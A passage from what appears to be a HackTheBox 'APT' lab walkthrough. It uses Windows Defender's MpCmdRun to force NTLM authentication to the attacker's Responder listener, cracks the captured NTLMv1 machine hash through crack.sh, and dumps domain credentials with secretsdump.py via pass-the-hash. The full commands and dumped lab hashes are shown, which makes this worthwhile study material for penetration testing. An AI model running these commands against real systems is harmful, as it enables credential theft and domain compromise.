Example: 1122334455667788
</pre></table></code></div></div><p>I tried to get <code class="language-plaintext highlighter-rouge">responder</code> to request LM hashes using the <code class="language-plaintext highlighter-rouge">--lm</code> argument, but it gave an error telling me to supply a challenge. The instructions on this hacktricks page are not as well written as a lot of others, but at least <code class="language-plaintext highlighter-rouge">responder</code> gave a verbose enough error message to fix the problem.</p><h3 id="mpcmdrunexe">MpCmdRun.exe</h3><ul><li><a href="https://gbhackers.com/hackers-can-steal-windows-ntlm/">https://gbhackers.com/hackers-can-steal-windows-ntlm/</a><li><a href="https://github.com/Gl3bGl4z/All_NTLM_leak">https://github.com/Gl3bGl4z/All_NTLM_leak</a></ul><p>Some more research revealed a GitHub account with a good list of different ways to leak NTLM hashes. The entry on Windows Defender intrigued me.</p><blockquote><p>Windows Defender MpCmdRun</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="s2">"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\MpCmdRun.exe"</span><span class="w"> </span><span class="nt">-Scan</span><span class="w"> </span><span class="nt">-ScanType</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="n">\\Server.domain\file.txt</span><span class="w"> </span><span class="s2">"c:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe"</span><span class="w"> </span><span class="nt">-DownloadFile</span><span class="w"> </span><span class="nt">-url</span><span class="w"> </span><span class="nx">https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">\\Server.domain\</span><span class="w">
</span></pre></table></code></div></div></blockquote><ul><li><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-antivirus/command-line-arguments-microsoft-defender-antivirus">https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-antivirus/command-line-arguments-microsoft-defender-antivirus</a></ul><blockquote><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">-Scan</span><span class="w"> </span><span class="p">[</span><span class="nt">-ScanType</span><span class="w"> </span><span class="p">[</span><span class="mi">0</span><span class="n">\</span><span class="o">|</span><span class="mi">1</span><span class="n">\</span><span class="o">|</span><span class="mi">2</span><span class="n">\</span><span class="o">|</span><span class="mi">3</span><span class="p">]]</span><span class="w"> </span><span class="p">[</span><span class="nt">-File</span><span class="w"> </span><span class="err">&lt;</span><span class="n">path</span><span class="err">&gt;</span><span class="w"> </span><span class="p">[</span><span class="nt">-DisableRemediation</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="nt">-BootSectorScan</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="nt">-CpuThrottling</span><span class="p">]]</span><span class="w"> </span><span class="p">[</span><span class="nt">-Timeout</span><span class="w"> </span><span class="err">&lt;</span><span class="n">days</span><span class="err">&gt;</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="nt">-Cancel</span><span class="p">]</span><span class="err">`</span><span class="w"> 
</span></pre></table></code></div></div><p>Scans for malicious software. Values for ScanType are: 0 Default, according to your configuration, -1 Quick scan, -2 Full scan, -3 File and directory custom scan.</p></blockquote><p>There was an argument that allowed for the user to specify a file or directory to scan. Remote share scanning sounded like a useful feature to exploit!</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">31</span><span class="n">m</span><span class="o">*</span><span class="nx">Evil-WinRM</span><span class="o">*</span><span class="p">[</span><span class="n">0m</span><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">1</span><span class="p">;</span><span class="mi">33</span><span class="n">m</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="p">[</span><span class="mi">0</span><span class="n">mC</span><span class="p">:</span><span class="n">\Users\henry.vinson_adm\Documents\test</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cd</span><span class="w"> </span><span class="s2">"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\"</span><span class="w">
</span><span class="n">Cannot</span><span class="w"> </span><span class="n">find</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="s1">'C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\'</span><span class="w"> </span><span class="n">because</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">does</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">exist.</span><span class="w">

</span><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">31</span><span class="n">m</span><span class="o">*</span><span class="nx">Evil-WinRM</span><span class="o">*</span><span class="p">[</span><span class="n">0m</span><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">1</span><span class="p">;</span><span class="mi">33</span><span class="n">m</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="p">[</span><span class="mi">0</span><span class="n">mC</span><span class="p">:</span><span class="n">\Users\henry.vinson_adm\Documents\test</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cd</span><span class="w"> </span><span class="s2">"C:\ProgramData\Microsoft\Windows Defender\platform\"</span><span class="w">
</span><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">31</span><span class="n">m</span><span class="o">*</span><span class="nx">Evil-WinRM</span><span class="o">*</span><span class="p">[</span><span class="n">0m</span><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">1</span><span class="p">;</span><span class="mi">33</span><span class="n">m</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="p">[</span><span class="mi">0</span><span class="n">mC</span><span class="p">:</span><span class="n">\ProgramData\Microsoft\Windows</span><span class="w"> </span><span class="nx">Defender\platform</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ls</span><span class="w">


    </span><span class="n">Directory</span><span class="p">:</span><span class="w"> </span><span class="n">C:\ProgramData\Microsoft\Windows</span><span class="w"> </span><span class="nx">Defender\platform</span><span class="w">


</span><span class="n">Mode</span><span class="w">                </span><span class="n">LastWriteTime</span><span class="w">         </span><span class="n">Length</span><span class="w"> </span><span class="n">Name</span><span class="w">
</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">
</span><span class="n">d-----</span><span class="w">       </span><span class="nx">11/10/2020</span><span class="w">  </span><span class="nx">11:09</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">4.18.2010.7-0</span><span class="w">
</span><span class="n">d-----</span><span class="w">        </span><span class="nx">3/17/2021</span><span class="w">   </span><span class="nx">3:13</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">4.18.2102.4-0</span><span class="w">
</span></pre></table></code></div></div><p>The example on the page did not work because the specified version of Windows Defender was different, but I found two newer versions in the <code class="language-plaintext highlighter-rouge">/platform</code> folder. I hoped that one of these would still be vulnerable to this issue.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">31</span><span class="n">m</span><span class="o">*</span><span class="nx">Evil-WinRM</span><span class="o">*</span><span class="p">[</span><span class="n">0m</span><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">1</span><span class="p">;</span><span class="mi">33</span><span class="n">m</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="p">[</span><span class="mi">0</span><span class="n">mC</span><span class="p">:</span><span class="n">\ProgramData\Microsoft\Windows</span><span class="w"> </span><span class="nx">Defender\platform\4.18.2010.7-0</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">/MpCmdRun.exe</span><span class="w"> </span><span class="nt">-Scan</span><span class="w"> </span><span class="nt">-ScanType</span><span class="w"> </span><span class="nx">3</span><span class="w"> </span><span class="nt">-file</span><span class="w"> </span><span class="nx">\\10.10.14.187\test</span><span class="w">
</span><span class="n">Scan</span><span class="w"> </span><span class="n">starting.</span><span class="o">..</span><span class="w">
</span><span class="n">CmdTool</span><span class="p">:</span><span class="w"> </span><span class="n">Failed</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">hr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x80508023.</span><span class="w"> </span><span class="n">Check</span><span class="w"> </span><span class="n">C:\Users\HENRY~2.VIN\AppData\Local\Temp\MpCmdRun.log</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">more</span><span class="w"> </span><span class="nx">information</span><span class="w">
</span><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">31</span><span class="n">m</span><span class="o">*</span><span class="nx">Evil-WinRM</span><span class="o">*</span><span class="p">[</span><span class="n">0m</span><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">1</span><span class="p">;</span><span class="mi">33</span><span class="n">m</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="p">[</span><span class="mi">0</span><span class="n">mC</span><span class="p">:</span><span class="n">\ProgramData\Microsoft\Windows</span><span class="w"> </span><span class="nx">Defender\platform\4.18.2010.7-0</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">type</span><span class="w"> </span><span class="nx">C:\Users\HENRY~2.VIN\AppData\Local\Temp\MpCmdRun.log</span><span class="w">
</span><span class="o">-------------------------------------------------------------------------------------</span><span class="w">

</span><span class="n">MpCmdRun</span><span class="p">:</span><span class="w"> </span><span class="n">Command</span><span class="w"> </span><span class="n">Line</span><span class="p">:</span><span class="w"> </span><span class="s2">"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe"</span><span class="w"> </span><span class="nt">-Scan</span><span class="w"> </span><span class="nt">-ScanType</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="n">\\10.10.14.187:8081\file.txt</span><span class="w">

 </span><span class="n">Start</span><span class="w"> </span><span class="n">Time</span><span class="p">:</span><span class="w">  </span><span class="n">Thu</span><span class="w">  </span><span class="n">Apr</span><span class="w">  </span><span class="mi">01</span><span class="w">  </span><span class="mi">2021</span><span class="w"> </span><span class="mi">22</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">24</span><span class="w">

</span><span class="n">MpEnsureProcessMitigationPolicy</span><span class="p">:</span><span class="w"> </span><span class="n">hr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x0</span><span class="w">

</span><span class="n">Starting</span><span class="w"> </span><span class="n">RunCommandScan.</span><span class="w">

</span><span class="n">INFO</span><span class="p">:</span><span class="w"> </span><span class="n">ScheduleJob</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">set.</span><span class="w"> </span><span class="n">Skipping</span><span class="w"> </span><span class="n">signature</span><span class="w"> </span><span class="n">update.</span><span class="w">

</span><span class="n">Scanning</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">file</span><span class="p">:</span><span class="w"> </span><span class="n">\\10.10.14.187:8081\file.txt.</span><span class="w">

</span><span class="n">Start</span><span class="p">:</span><span class="w"> </span><span class="n">MpScan</span><span class="p">(</span><span class="n">MP_FEATURE_SUPPORTED</span><span class="p">,</span><span class="w"> </span><span class="n">dwOptions</span><span class="o">=</span><span class="mi">16385</span><span class="p">,</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="n">\\10.10.14.187:8081\file.txt</span><span class="p">,</span><span class="w"> </span><span class="nx">DisableRemediation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">BootSectorScan</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">Timeout</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">days</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w">

</span><span class="n">MpScan</span><span class="p">()</span><span class="w"> </span><span class="n">started</span><span class="w">

</span><span class="n">Warning</span><span class="p">:</span><span class="w"> </span><span class="n">MpScan</span><span class="p">()</span><span class="w"> </span><span class="n">encounter</span><span class="w"> </span><span class="n">errror.</span><span class="w"> </span><span class="n">hr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x80508023</span><span class="w">

</span><span class="n">MpScan</span><span class="p">()</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">completed</span><span class="w">

</span><span class="n">ERROR</span><span class="p">:</span><span class="w"> </span><span class="n">MpScan</span><span class="p">(</span><span class="n">dwOptions</span><span class="o">=</span><span class="mi">16385</span><span class="p">)</span><span class="w"> </span><span class="n">Completion</span><span class="w"> </span><span class="n">Failed</span><span class="w"> </span><span class="mi">80508023</span><span class="w">

</span><span class="n">MpCmdRun.exe</span><span class="p">:</span><span class="w"> </span><span class="n">hr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x80508023.</span><span class="w">

</span><span class="n">MpCmdRun</span><span class="p">:</span><span class="w"> </span><span class="n">End</span><span class="w"> </span><span class="n">Time</span><span class="p">:</span><span class="w">  </span><span class="n">Thu</span><span class="w">  </span><span class="n">Apr</span><span class="w">  </span><span class="mi">01</span><span class="w">  </span><span class="mi">2021</span><span class="w"> </span><span class="mi">22</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">24</span><span class="w">

</span><span class="o">-------------------------------------------------------------------------------------</span><span class="w">

</span><span class="o">-------------------------------------------------------------------------------------</span><span class="w">

</span><span class="n">MpCmdRun</span><span class="p">:</span><span class="w"> </span><span class="n">Command</span><span class="w"> </span><span class="n">Line</span><span class="p">:</span><span class="w"> </span><span class="s2">"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe"</span><span class="w"> </span><span class="nt">-h</span><span class="w">

 </span><span class="n">Start</span><span class="w"> </span><span class="n">Time</span><span class="p">:</span><span class="w">  </span><span class="n">Thu</span><span class="w">  </span><span class="n">Apr</span><span class="w">  </span><span class="mi">01</span><span class="w">  </span><span class="mi">2021</span><span class="w"> </span><span class="mi">22</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">13</span><span class="w">



</span><span class="n">MpEnsureProcessMitigationPolicy</span><span class="p">:</span><span class="w"> </span><span class="n">hr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x0</span><span class="w">

</span><span class="n">MpCmdRun</span><span class="p">:</span><span class="w"> </span><span class="n">End</span><span class="w"> </span><span class="n">Time</span><span class="p">:</span><span class="w">  </span><span class="n">Thu</span><span class="w">  </span><span class="n">Apr</span><span class="w">  </span><span class="mi">01</span><span class="w">  </span><span class="mi">2021</span><span class="w"> </span><span class="mi">22</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">13</span><span class="w">

</span><span class="o">-------------------------------------------------------------------------------------</span><span class="w">

</span><span class="o">-------------------------------------------------------------------------------------</span><span class="w">

</span><span class="n">MpCmdRun</span><span class="p">:</span><span class="w"> </span><span class="n">Command</span><span class="w"> </span><span class="n">Line</span><span class="p">:</span><span class="w"> </span><span class="s2">"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe"</span><span class="w"> </span><span class="nt">-Scan</span><span class="w"> </span><span class="nt">-ScanType</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="n">\\10.10.14.187\</span><span class="w">

 </span><span class="n">Start</span><span class="w"> </span><span class="n">Time</span><span class="p">:</span><span class="w">  </span><span class="n">Thu</span><span class="w">  </span><span class="n">Apr</span><span class="w">  </span><span class="mi">01</span><span class="w">  </span><span class="mi">2021</span><span class="w"> </span><span class="mi">22</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">56</span><span class="w">

</span><span class="n">MpEnsureProcessMitigationPolicy</span><span class="p">:</span><span class="w"> </span><span class="n">hr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x0</span><span class="w">

</span><span class="n">Starting</span><span class="w"> </span><span class="n">RunCommandScan.</span><span class="w">

</span><span class="n">MpCmdRun.exe</span><span class="p">:</span><span class="w"> </span><span class="n">hr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x80070667.</span><span class="w">

</span><span class="n">MpCmdRun</span><span class="p">:</span><span class="w"> </span><span class="n">End</span><span class="w"> </span><span class="n">Time</span><span class="p">:</span><span class="w">  </span><span class="n">Thu</span><span class="w">  </span><span class="n">Apr</span><span class="w">  </span><span class="mi">01</span><span class="w">  </span><span class="mi">2021</span><span class="w"> </span><span class="mi">22</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">56</span><span class="w">

</span><span class="o">-------------------------------------------------------------------------------------</span><span class="w">

</span><span class="o">-------------------------------------------------------------------------------------</span><span class="w">

</span><span class="n">MpCmdRun</span><span class="p">:</span><span class="w"> </span><span class="n">Command</span><span class="w"> </span><span class="n">Line</span><span class="p">:</span><span class="w"> </span><span class="s2">"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe"</span><span class="w"> </span><span class="nt">-Scan</span><span class="w"> </span><span class="nt">-ScanType</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="nt">-file</span><span class="w"> </span><span class="n">\\10.10.14.187\test</span><span class="w">

 </span><span class="n">Start</span><span class="w"> </span><span class="n">Time</span><span class="p">:</span><span class="w">  </span><span class="n">Thu</span><span class="w">  </span><span class="n">Apr</span><span class="w">  </span><span class="mi">01</span><span class="w">  </span><span class="mi">2021</span><span class="w"> </span><span class="mi">22</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">07</span><span class="w">

</span><span class="n">MpEnsureProcessMitigationPolicy</span><span class="p">:</span><span class="w"> </span><span class="n">hr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x0</span><span class="w">

</span><span class="n">Starting</span><span class="w"> </span><span class="n">RunCommandScan.</span><span class="w">

</span><span class="n">INFO</span><span class="p">:</span><span class="w"> </span><span class="n">ScheduleJob</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">set.</span><span class="w"> </span><span class="n">Skipping</span><span class="w"> </span><span class="n">signature</span><span class="w"> </span><span class="n">update.</span><span class="w">

</span><span class="n">Scanning</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">file</span><span class="p">:</span><span class="w"> </span><span class="n">\\10.10.14.187\test.</span><span class="w">

</span><span class="n">Start</span><span class="p">:</span><span class="w"> </span><span class="n">MpScan</span><span class="p">(</span><span class="n">MP_FEATURE_SUPPORTED</span><span class="p">,</span><span class="w"> </span><span class="n">dwOptions</span><span class="o">=</span><span class="mi">16385</span><span class="p">,</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="n">\\10.10.14.187\test</span><span class="p">,</span><span class="w"> </span><span class="nx">DisableRemediation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">BootSectorScan</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">Timeout</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">days</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w">

</span><span class="n">MpScan</span><span class="p">()</span><span class="w"> </span><span class="n">started</span><span class="w">

</span><span class="n">Warning</span><span class="p">:</span><span class="w"> </span><span class="n">MpScan</span><span class="p">()</span><span class="w"> </span><span class="n">encounter</span><span class="w"> </span><span class="n">errror.</span><span class="w"> </span><span class="n">hr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x80508023</span><span class="w">

</span><span class="n">MpScan</span><span class="p">()</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">completed</span><span class="w">

</span><span class="n">ERROR</span><span class="p">:</span><span class="w"> </span><span class="n">MpScan</span><span class="p">(</span><span class="n">dwOptions</span><span class="o">=</span><span class="mi">16385</span><span class="p">)</span><span class="w"> </span><span class="n">Completion</span><span class="w"> </span><span class="n">Failed</span><span class="w"> </span><span class="mi">80508023</span><span class="w">

</span><span class="n">MpCmdRun.exe</span><span class="p">:</span><span class="w"> </span><span class="n">hr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x80508023.</span><span class="w">

</span><span class="n">MpCmdRun</span><span class="p">:</span><span class="w"> </span><span class="n">End</span><span class="w"> </span><span class="n">Time</span><span class="p">:</span><span class="w">  </span><span class="n">Thu</span><span class="w">  </span><span class="n">Apr</span><span class="w">  </span><span class="mi">01</span><span class="w">  </span><span class="mi">2021</span><span class="w"> </span><span class="mi">22</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">11</span><span class="w">

</span><span class="o">-------------------------------------------------------------------------------------</span><span class="w">
</span></pre></table></code></div></div><p>The scan reported that it failed after doing each of its checks.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ sudo responder -I tun0 --lm           
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR &amp; MDNS Responder 3.0.2.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C
  
...snipped...

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.187]
    Challenge set              [1122334455667788]
    Don't Respond To Names     ['ISATAP']



[+] Listening for events...
[SMB] NTLMv1 Client   : 10.10.10.213
[SMB] NTLMv1 Username : HTB\APT$
[SMB] NTLMv1 Hash     : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788                                                          
[*] Skipping previously captured hash for HTB\APT$
[*] Skipping previously captured hash for HTB\APT$
[*] Skipping previously captured hash for HTB\APT$
[*] Skipping previously captured hash for HTB\APT$
[*] Skipping previously captured hash for HTB\APT$
</pre></table></code></div></div><p>However, I got a hit back on my listener! I had the NTLMv1 hash of the user <code class="language-plaintext highlighter-rouge">APT$</code>.</p><h3 id="cracksh">crack.sh</h3><blockquote><p>Remember that the printer will use the computer account during the authentication, and computer accounts use long and random passwords that you probably won’t be able to crack using common dictionaries. But the NTLMv1 authentication uses DES (more info here), so using some services specially dedicated to cracking DES you will be able to crack it (you could use <a href="https://crack.sh/">https://crack.sh/</a> for example).</p></blockquote><p>The hacktricks blog mentioned that I would get the computer account hash, which seemed to be true. It also mentioned to use the <code class="language-plaintext highlighter-rouge">crack.sh</code> service to crack it. This is a website that offers cracking services using their pre-computed rainbow tables.</p><ul><li><a href="https://crack.sh/netntlm/">https://crack.sh/netntlm/</a></ul><blockquote><p>There’s a number of articles on the LmCompatibilityLevel setting in Windows, but this will only work if a client has this setting at 2 or lower.</p></blockquote><p>This matched what I had found on the machine. It was looking good so far.</p><ul><li><a href="https://crack.sh/get-cracking/">https://crack.sh/get-cracking/</a></ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/crack.sh.png" alt="Screenshot of the website crack.sh" /></p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/crack-sh2.png" alt="Message from crack.sh showing the queued job" /></p><p>I put the hash into the format they wanted it submitted in, then entered a throwaway email address and submitted the hash. The cracking service for NTLMv1 hashes in the correct format is free.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>Crack.sh has successfully completed its attack against your NETNTLM handshake. The NT hash for the handshake is included below, and can be plugged back into the 'chapcrack' tool to decrypt a packet capture, or to authenticate to the server:

Token: $NETNTLM$1122334455667788$95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
Key: d167c3238864b12f5f82feae86a7f798

This run took 32 seconds. Thank you for using crack.sh, this concludes your job.
</pre></table></code></div></div><p>I received an email back from their server very quickly. It only took 32 seconds to find the hash in the rainbow table. Now I just needed to figure out how to use the machine account hash so I did some more research.</p><ul><li><a href="http://blog.carnal0wnage.com/2015/09/domain-controller-machine-account-to.html">http://blog.carnal0wnage.com/2015/09/domain-controller-machine-account-to.html</a><li><a href="https://winaero.com/beware-microsoft-defender-mpcmdrun-exe-tool-can-be-used-to-download-files/">https://winaero.com/beware-microsoft-defender-mpcmdrun-exe-tool-can-be-used-to-download-files/</a></ul><blockquote><p><code class="language-plaintext highlighter-rouge">python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc LAB/DC2k8_1\$@172.16.102.15</code></p></blockquote><p>I found an article that explained how to format a query using <code class="language-plaintext highlighter-rouge">secretsdump.py</code> to dump the remote NTDS database. This time it would be the live database and not the backup I had retrieved earlier.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/apt]
└─$ python3 /home/zweilos/.local/bin/secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798 -just-dc HTB/APT\$@apt.htb.local
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::
henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::
APT$:1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72f9fc8f3cd23768be8d37876d459ef09ab591a729924898e5d9b3c14db057e3
Administrator:aes128-cts-hmac-sha1-96:a3b0c1332eee9a89a2aada1bf8fd9413
Administrator:des-cbc-md5:0816d9d052239b8a
krbtgt:aes256-cts-hmac-sha1-96:b63635342a6d3dce76fcbca203f92da46be6cdd99c67eb233d0aaaaaa40914bb
krbtgt:aes128-cts-hmac-sha1-96:7735d98abc187848119416e08936799b
krbtgt:des-cbc-md5:f8c26238c2d976bf
henry.vinson:aes256-cts-hmac-sha1-96:63b23a7fd3df2f0add1e62ef85ea4c6c8dc79bb8d6a430ab3a1ef6994d1a99e2
henry.vinson:aes128-cts-hmac-sha1-96:0a55e9f5b1f7f28aef9b7792124af9af
henry.vinson:des-cbc-md5:73b6f71cae264fad
henry.vinson_adm:aes256-cts-hmac-sha1-96:f2299c6484e5af8e8c81777eaece865d54a499a2446ba2792c1089407425c3f4
henry.vinson_adm:aes128-cts-hmac-sha1-96:3d70c66c8a8635bdf70edf2f6062165b
henry.vinson_adm:des-cbc-md5:5df8682c8c07a179
APT$:aes256-cts-hmac-sha1-96:4c318c89595e1e3f2c608f3df56a091ecedc220be7b263f7269c412325930454
